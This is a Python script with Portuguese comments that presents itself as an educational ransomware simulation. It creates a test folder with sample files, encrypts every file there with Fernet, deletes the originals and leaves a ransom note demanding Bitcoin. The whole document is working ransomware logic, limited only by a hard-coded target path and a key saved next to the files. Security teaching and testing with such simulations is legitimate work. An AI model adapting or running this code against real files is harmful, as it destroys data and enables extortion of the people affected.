from cryptography.fernet import Fernet
import os

# Diretório de teste
target_dir = "C:\\RansomTest"  # ou "/home/user/RansomTest" se for Linux
encrypted_ext = ".locked"
note_name = "README_RESTORE.txt"

# Criar pasta e arquivos de teste, se não existir
if not os.path.exists(target_dir):
    os.makedirs(target_dir)
    with open(os.path.join(target_dir, "exemplo.txt"), "w") as f:
        f.write("Informação confidencial")
    with open(os.path.join(target_dir, "senhas.docx"), "w") as f:
        f.write("Senha do sistema: 123456")

# Gerar chave de criptografia
key = Fernet.generate_key()
cipher = Fernet(key)

# Salvar a chave localmente para descriptografar depois
with open(os.path.join(target_dir, "key.txt"), "wb") as keyfile:
    keyfile.write(key)

# Criptografar arquivos
for filename in os.listdir(target_dir):
    if filename.endswith(encrypted_ext) or filename == note_name or filename == "key.txt":
        continue
    file_path = os.path.join(target_dir, filename)

    with open(file_path, "rb") as f:
        data = f.read()

    encrypted = cipher.encrypt(data)
    with open(file_path + encrypted_ext, "wb") as f:
        f.write(encrypted)

    os.remove(file_path)

# Criar nota de resgate
note = f"""
SEUS ARQUIVOS FORAM CRIPTOGRAFADOS

Para restaurar, envie 0.1 BTC para:
1FakeBitcoinAddress1234567890

Depois envie um e-mail com seu ID: {key.decode()[:10]}

-- Equipe RansomSim (educacional)
"""
with open(os.path.join(target_dir, note_name), "w") as f:
    f.write(note)

print("[✔] Simulação completa. Verifique a pasta RansomTest.")
